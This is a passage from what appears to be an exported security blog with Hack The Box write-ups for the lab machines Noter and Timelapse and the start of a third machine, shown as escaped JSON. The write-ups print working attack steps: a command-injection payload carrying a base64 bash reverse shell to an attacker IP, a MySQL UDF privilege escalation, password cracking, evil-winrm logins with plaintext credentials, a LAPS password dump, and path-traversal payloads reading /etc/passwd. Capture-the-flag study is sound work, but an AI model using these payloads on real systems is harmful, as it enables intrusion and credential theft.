the app.py is different (they hace differenc CRC values):\n$ diff \u0026lt;(unzip -v app_backup_1638395546.zip) \u0026lt;(unzip -v app_backup_1635803546.zip) 1c1 \u0026lt; Archive: app_backup_1638395546.zip --- \u0026gt; Archive: app_backup_1635803546.zip 4c4 \u0026lt; 13507 Defl:N 3138 77% 12-26-2021 22:49 f64d2c7c app.py --- \u0026gt; 9178 Defl:N 2399 74% 12-26-2021 22:48 5c7d6fd3 app.py 30c30 \u0026lt; 70459 22018 69% 25 files --- \u0026gt; 66130 21279 68% 25 files  Static code analysis The interesting lines of code of app_backup_1635803546/app.py are some database credentials:\n#!/usr/bin/python3 # imports app= Flask(__name__) # Config MySQL app.config['MYSQL_HOST'] ='localhost' app.config['MYSQL_USER'] ='root' app.config['MYSQL_PASSWORD'] ='Nildogg36' app.config['MYSQL_DB'] ='app' app.config['MYSQL_CURSORCLASS'] ='DictCursor' # init MySQL mysql= MySQL(app) # ...  In app_backup_1635803546/app.py these credentials are different, but don\u0026rsquo;t appear to be correct. Moreover, we have the code used to export notes from Markdown to PDF:\n@app.route('/export_note_local/\u0026lt;string:id\u0026gt;', methods=['GET']) @is_logged_in defexport_note_local(id): ifcheck_VIP(session['username']): cur=mysql.connection.cursor() result=cur.execute(\"SELECT * FROM notes WHERE id = %sand author = %s\", (id,session['username'])) ifresult\u0026gt;0: note=cur.fetchone() rand_int=random.randint(1,10000) command=f\"node misc/md-to-pdf.js $'{note['body']}' {rand_int}\" subprocess.run(command, shell=True, executable=\"/bin/bash\")  returnsend_file(attachment_dir+str(rand_int) +'.pdf', as_attachment=True) else: returnrender_template('dashboard.html') else: abort(403)  Foothold on the machine Here we have a command injection vulnerability, because we can exit from the single quotes and inject a system command:\nsubprocess.run(command, shell=True, executable=\"/bin/bash\")  Just like this:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; body = \"'; whoami; echo '\" \u0026gt;\u0026gt;\u0026gt; command = f\"node misc/md-to-pdf.js $'{body}' {1337}\" \u0026gt;\u0026gt;\u0026gt; command \"node misc/md-to-pdf.js $''; whoami; echo '' 1337\"  So we can get a reverse shell on the machine.\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  This is the payload we need to enter in a note:\n'; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash; echo '  Then we export it as PDF and we get the connection back in nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.160. Ncat: Connection from 10.10.11.160:60110. bash: cannot set terminal process group (257434): Inappropriate ioctl for device bash: no job control in this shell svc@noter:~/app/web$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null svc@noter:~/app/web$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm svc@noter:~/app/web$ export TERM=xterm svc@noter:~/app/web$ export SHELL=bash svc@noter:~/app/web$ stty rows 50 columns 158  At this point, we can get the user.txt flag:\nsvc@noter:~/app/web$ cd svc@noter:~$ cat user.txt 92d9fa6e5b473e1696d8ce38214a5dc6  System enumeration Basic enumeration only shows that there is a backup.sh script in /opt:\nsvc@noter:~$ ls -la /opt total 12 drwxr-xr-x 2 root root 4096 May 2 23:05 . drwxr-xr-x 19 root root 4096 May 2 23:05 .. -rwxr--r-- 1 root root 137 Dec 30 2021 backup.sh svc@noter:~$ cat /opt/backup.sh #!/bin/bash zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\\*  But it does not seem to be run by other user.\nIf we use linpeas.sh, we can see that MySQL is configured to run as root:\n╔══════════╣ Searching mysql credentials and exec From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user = root Found readable /etc/mysql/my.cnf [client-server] !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/  This is an issue because we can execute commands as root using User Defined Functions (UDF). This blog post shows the necessary files and steps to complete the exploit. We will need this C program.\nPrivilege escalation We only need to follow the steps of the blog post.\nFirst, we download and compile the exploit as stated:\nsvc@noter:~$ cd /tmp svc@noter:/tmp$ wget -q 10.10.17.44/raptor_udf2.c svc@noter:/tmp$ gcc -g -c raptor_udf2.c svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  To access MySQL we can use the credentials found in app.py. Then, we can continue with exploitation to set /bin/bash to be a SUID binary:\nsvc@noter:/tmp$ mysql --user=root --password=Nildogg36 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 12759 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u0026gt; show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]\u0026gt; show variables like '%secure_file_priv%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ 1 row in set (0.001 sec) MariaDB [(none)]\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [mysql]\u0026gt; create table foo(line blob); Query OK, 0 rows affected (0.005 sec) MariaDB [mysql]\u0026gt; insert into foo values(load_file('/tmp/raptor_udf2.so')); Query OK, 1 row affected (0.002 sec) MariaDB [mysql]\u0026gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; Query OK, 1 row affected (0.001 sec) MariaDB [mysql]\u0026gt; create function do_system returns integer soname 'raptor_udf2.so'; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]\u0026gt; select * from mysql.func; +-----------+-----+----------------+----------+ | name | ret | dl | type | +-----------+-----+----------------+----------+ | do_system | 2 | raptor_udf2.so | function | +-----------+-----+----------------+----------+ 1 row in set (0.000 sec) MariaDB [mysql]\u0026gt; select do_system('chmod 4755 /bin/bash'); +-----------------------------------+ | do_system('chmod 4755 /bin/bash') | +-----------------------------------+ | 0 | +-----------------------------------+ 1 row in set (0.003 sec) MariaDB [mysql]\u0026gt; exit Bye  And now /bin/bash is SUID:\nsvc@noter:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  So we can run Bash as root:\nsvc@noter:/tmp$ bash -p bash-5.0# cat /root/root.txt 55410fc79784d12a27222bcce0528f14  ","image":"/images/HTB/Noter/Noter.png","permalink":"https://7rocky.github.io/en/htb/noter/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation","time":10,"title":"Noter"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.11.152   Release: 26 / 03 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,53215 Nmap scan report for 10.10.11.152 Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-28 00:13:43Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 |_ssl-date: 2022-03-28T00:15:13+00:00; +8h18m23s from scanner time. |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 53215/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-03-28T00:14:36 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 8h18m22s, deviation: 0s, median: 8h18m22s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 100.14 seconds  This machine has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) and 5986 (WinRM/SSL) open, within others.\n$ crackmapexec smb 10.10.11.152 SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)  Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding timelapse.htb into /etc/hosts.\nSMB enumeration We can start looking at SMB using a null session:\n$ smbclient -L 10.10.11.152 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available  We see that there is a share called Shares. We can connect to it and list some folders:\n$ smbclient //10.10.11.152/Shares -N Try \"help\" to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon Oct 25 10:39:15 2021 .. D 0 Mon Oct 25 10:39:15 2021 Dev D 0 Mon Oct 25 14:40:06 2021 HelpDesk D 0 Mon Oct 25 10:48:42 2021 6367231 blocks of size 4096. 2285718 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; dir . D 0 Mon Oct 25 14:40:06 2021 .. D 0 Mon Oct 25 14:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 10:46:42 2021 6367231 blocks of size 4096. 2285702 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (8.4 KiloBytes/sec) (average 8.4 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd ..\\HelpDesk\\ smb: \\HelpDesk\\\u0026gt; dir . D 0 Mon Oct 25 10:48:42 2021 .. D 0 Mon Oct 25 10:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 09:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 09:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 09:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 09:57:44 2021 6367231 blocks of size 4096. 2285718 blocks available smb: \\HelpDesk\\\u0026gt; mget * Get file LAPS.x64.msi? y getting file \\HelpDesk\\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (545.5 KiloBytes/sec) (average 475.1 KiloBytes/sec) Get file LAPS_Datasheet.docx? y getting file \\HelpDesk\\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (265.6 KiloBytes/sec) (average 445.1 KiloBytes/sec) Get file LAPS_OperationsGuide.docx? y getting file \\HelpDesk\\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (654.5 KiloBytes/sec) (average 500.1 KiloBytes/sec) Get file LAPS_TechnicalSpecification.docx? y getting file \\HelpDesk\\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (176.6 KiloBytes/sec) (average 468.0 KiloBytes/sec) smb: \\HelpDesk\\\u0026gt; exit  We have downloaded all these files:\n winrm_backup.zip LAPS.x64.msi LAPS_Datasheet.docx LAPS_OperationsGuide.docx LAPS_TechnicalSpecification.docx  Cracking files The ZIP archive is password-protected:\n$ unzip -l winrm_backup.zip Archive: winrm_backup.zip Length Date Time Name --------- ---------- ----- ---- 2555 2021-10-25 09:21 legacyy_dev_auth.pfx --------- ------- 2555 1 file $ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password:  We can use fcrackzip to find the password using a brute force attack:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt winrm_backup.zip PASSWORD FOUND!!!!: pw == supremelegacy  $ unzip -P supremelegacy winrm_backup.zip Archive: winrm_backup.zip inflating: legacyy_dev_auth.pfx  The ZIP file stores a PFX file, which contains a pair of keys to connect to WinRM. Notice that the open port is 5986, not 5985 as usually. That is because it is using SSL and thus we need some private and public keys in order to connect.\nWe can extract these keys using openssl:\n$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv-key.pem Enter Import Password: Can't read Password  But we need another password because supremelegacy does not work.\nI found a tool called crackpkcs12 to make a brute force attack:\n$ ./crackpkcs12 -d $WORDLISTS/rockyou.txt legacyy_dev_auth.pfx Dictionary attack - Starting 1 threads ********************************************************* Dictionary attack - Thread 1 - Password found: thuglegacy *********************************************************  And we get another password, let\u0026rsquo;s take the keys:\n$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv-key.pem Enter Import Password: MAC verified OK $ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pub-key.pem Enter Import Password: MAC verified OK  Now we can use evil-winrm to connect to the machine (there is no need to use username/password because they come within the keys):\n$ evil-winrm -i 10.10.11.152 --ssl -k priv-key.pem -c pub-key.pem Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type ..\\Desktop\\user.txt 76a99a6d71f58a99a2844eb3b48334e3  And there we have user.txt flag.\nSystem enumeration Let\u0026rsquo;s enumerate some users:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; cd ..\\.. *Evil-WinRM* PS C:\\Users\u0026gt; dir Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 10/23/2021 11:27 AM Administrator d----- 10/25/2021 8:22 AM legacyy d-r--- 10/23/2021 11:27 AM Public d----- 10/25/2021 12:23 PM svc_deploy d----- 2/23/2022 5:45 PM TRX *Evil-WinRM* PS C:\\Users\u0026gt; net user legacyy User name legacyy Full Name Legacyy Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/23/2021 12:17:10 PM Password expires Never Password changeable 10/24/2021 12:17:10 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/28/2022 5:10:20 PM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *Domain Users *Development The command completed successfully. *Evil-WinRM* PS C:\\Users\u0026gt; net user svc_deploy User name svc_deploy Full Name svc_deploy Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/25/2021 12:12:37 PM Password expires Never Password changeable 10/26/2021 12:12:37 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/28/2022 1:16:01 AM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *LAPS_Readers *Domain Users The command completed successfully. *Evil-WinRM* PS C:\\Users\u0026gt; net user TRX User name TRX Full Name TRX Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/23/2022 6:43:45 PM Password expires Never Password changeable 2/24/2022 6:43:45 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/27/2022 10:29:10 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins The command completed successfully.  We see that svc_deploy belongs to LAPS_Readers and TRX belongs to Domain Admins.\nLAPS is the acronym for Local Account Password Solution, which generates secure password for administrators (the Word documents found before provide enough information). If we can access as svc_deploy we will be able to see the password by LAPS.\nAfter some enumeration, we discover that legacyy has a PowerShell history with useful commands:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; dir C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Directory: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/3/2022 11:46 PM 434 ConsoleHost_history.txt *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit  There we have the password for svc_deploy. Now we can execute commands as svc_deploy using script blocks:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; Invoke-Command -ComputerName localhost -Credential $c -Port 5986 -usessl -SessionOption $so -ScriptBlock { whoami } timelapse\\svc_deploy  And even connect to the machine using evil-winrm:\n$ evil-winrm -i 10.10.11.152 --ssl -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt;  Privilege escalation But the most important thing is that we can get the password configured by LAPS using crackmapexec:\n$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps LDAP 10.10.11.152 389 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.152 389 DC01 [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS 10.10.11.152 389 DC01 [*] Getting LAPS Passwords LAPS 10.10.11.152 389 DC01 Computer: DC01$ Password: h!0yj-1WI(YlDIz+2Il@w1/(  Now we have access as Administrator:\n$ evil-winrm -i 10.10.11.152 --ssl -u Administrator -p 'h!0yj-1WI(YlDIz+2Il@w1/(' Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ..\\Desktop\\root.txt Cannot find path 'C:\\Users\\Administrator\\Desktop\\root.txt' because it does not exist. At line:1 char:1 + type ..\\Desktop\\root.txt + ~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (C:\\Users\\Administrator\\Desktop\\root.txt:String) [Get-Content], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand  But where is root.txt? Well, let\u0026rsquo;s search it:\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; Get-ChildItem root.txt -Path C:\\Users\\ -Recurse Directory: C:\\Users\\TRX\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/28/2022 6:16 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type C:\\Users\\TRX\\Desktop\\root.txt 1505bebfda29707adf43cf8530421b35  ","image":"/images/HTB/Timelapse/Timelapse.png","permalink":"https://7rocky.github.io/en/htb/timelapse/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment where we can find an encrypted ZIP file in SMB. We can crack the password and find a PFX file holding public and private keys for WinRM. Again we can crack the password and extract the keys to connect to the machine. There is a PowerShell history where we find a password for a LAPS reader member, which will tell us the password for Administrator. Basic Windows exploitation techniques and enumeration are needed in order to compromise this machine","time":8,"title":"Timelapse"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.154   Release: 02 / 04 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.154 -p 22,80 Nmap scan report for 10.10.11.154 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA) | 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA) |_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519) 80/tcp open http nginx | http-title: Agency - Start Bootstrap Theme |_Requested resource was /index.php?page=default.html Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.11 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.154, we will see a page like this:\nIt only shows some information about something called EMUEMU and OSTRICH. No idea yet.\nLet\u0026rsquo;s apply fuzzing to enumerate more routes. Notice I am using .php and .html extensions:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.154/FUZZ -e .php,.html index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms] default.html [Status: 200, Size: 11414, Words: 4081, Lines: 189, Duration: 39ms] assets [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 39ms] css [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 40ms] beta.html [Status: 200, Size: 4144, Words: 1137, Lines: 73, Duration: 71ms] js [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 42ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]  Nice, we have beta.html. Let\u0026rsquo;s see what\u0026rsquo;s there:\nWe are able to upload a license key file, and it should have 512 bits. There is no more information about this. If we try to upload something, the server response is just blank, it doesn\u0026rsquo;t matter what we upload, there is no feedback.\nThe form is posted to activate_license.php:\nFoothold As the index.php accepts a parameter called page, it is shouting to enter some Local File Inclusion / Directory Path Traversal payload. Let\u0026rsquo;s try:\n$ curl '10.10.11.154?page=/etc/passwd' root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin _chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin vagrant:x:1000:1000::/vagrant:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin dev:x:1001:1001::/home/dev:/bin/bash  Nice, there is a Directory Path Traversal vulnerability (since the file is just read, not executed).\nDirectory Path Traversal exploitation Let\u0026rsquo;s get the PHP source files:\n$ curl '10.10.11.154?page=index.php'  \u0026lt;?php function sanitize_input($param) { $param1 = str_replace(\"../\", \"\", $param); $param2 = str_replace(\"./\", \"\", $param1); return $param2; } $page = $_GET['page']; if (isset($page) \u0026amp;\u0026amp; preg_match(\"/^[a-z]/\", $page)) { $page = sanitize_input($page); } else { header('Location: /index.php?page=default.html'); } readfile($page);  One thing to notice is that the browser will redirect to index.php?page=default.html, so we won\u0026rsquo;t notice that the file is rendered in the response. Since curl does not follow redirects by default, we can read the response body even it the response contains a redirection.\nNow let\u0026rsquo;s see how the file upload is being handled:\n$ curl '10.10.11.154?page=activate_license.php'  \u0026lt;?php if (isset($_FILES['licensefile'])) { $license = file_get_contents($_FILES['licensefile']['tmp_name']); $license_size = $_FILES['licensefile']['size']; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$socket) { echo \"error socket_create()\\n\"; } if (!socket_connect($socket, '127.0.0.1', 1337)) { echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\"; } socket_write($socket, pack(\"N\", $license_size)); socket_write($socket, $license); socket_shutdown($socket); socket_close($socket); }  Interesting, it is connecting to a local socket server on port 1337 and passing the size of the file and its contents.\nSince we have a Directory Path Traversal vulnerability, we can enumerate processes reading from /proc/\u0026lt;PID\u0026gt;. Every \u0026ldquo;PID\u0026rdquo; directory contains some files related to the process itself. We are interested in /proc/\u0026lt;PID\u0026gt;/cmdline to know the command used to start the process. Let\u0026rsquo;s use brute force to enumerate processes and see if we find the one that is running on port 1337:\n$ for i in {1..1000}; do echo -n \"$i: \"; curl \"10.10.11.154?page=/proc/$i/cmdline\" -so -; echo; done | grep -a ': .' 411: /usr/bin/activate_license1337 576: nginx: worker process 577: nginx: worker process  Notice that there are null bytes:\n$ curl '10.10.11.154?page=/proc/411/cmdline' -so - | xxd 00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174 /usr/bin/activat 00000010: 655f 6c69 6365 6e73 6500 3133 3337 00 e_license.1337. $ curl '10.10.11.154?page=/proc/426/cmdline' -so - | tr '\\0' ' ' /usr/bin/activate_license 1337  Alright, it seems that there is a file called /usr/bin/activate_license, let\u0026rsquo;s download it:\n$ curl '10.10.11.154?page=/usr/bin/activate_license' \u0026gt; activate_license $ file activate_license activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped  Binary analysis It is an ELF 64-bit binary\u0026hellip; Things get hot\u0026hellip; The fact that the license key has a fixed size points out that maybe the binary is vulnerable to Buffer Overflow. These are the protections set on the binary:\n$ checksec activate_license [*] './activate_license' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Mmm, really hardened\u0026hellip; We will need to get at least two addresses at runtime: one address from Glibc to bypass ASLR and one address from the binary to bypass PIE. Moreover, since NX is enabled, we must use Return Oriented Programming (ROP).\nLet\u0026rsquo;s use Ghidra ti decompile the binary and analyze it. This is the main function:\nint main(int argc, char **argv) { int iVar1; __pid_t _Var2; int *piVar3; char *pcVar4; char clientaddr_s[16]; sockaddr_in clientaddr; socklen_t clientaddrlen; sockaddr_in server; uint16_t port; int clientfd; int serverfd; if (argc != 2) { error(\"specify port to bind to\"); } iVar1 = __isoc99_sscanf(argv[1], \"%hu\", \u0026amp;port); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } printf(\"[+] starting server listening on port %d\\n\", (ulong) port); server.sin_family = 2; server.sin_addr = htonl(0x7f000001); server.sin_port = htons(port); serverfd = socket(2, 1, 6); if (serverfd == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = bind(serverfd, (sockaddr *) \u0026amp;server, 0x10); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = listen(serverfd, 100); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } puts(\"[+] listening ...\"); while (true) { while (true) { clientfd = accept(serverfd, (sockaddr *) \u0026amp;clientaddr, \u0026amp;clientaddrlen); if (clientfd != -1) break; fwrite(\"Error: accepting client\\n\", 1, 0x18, stderr); 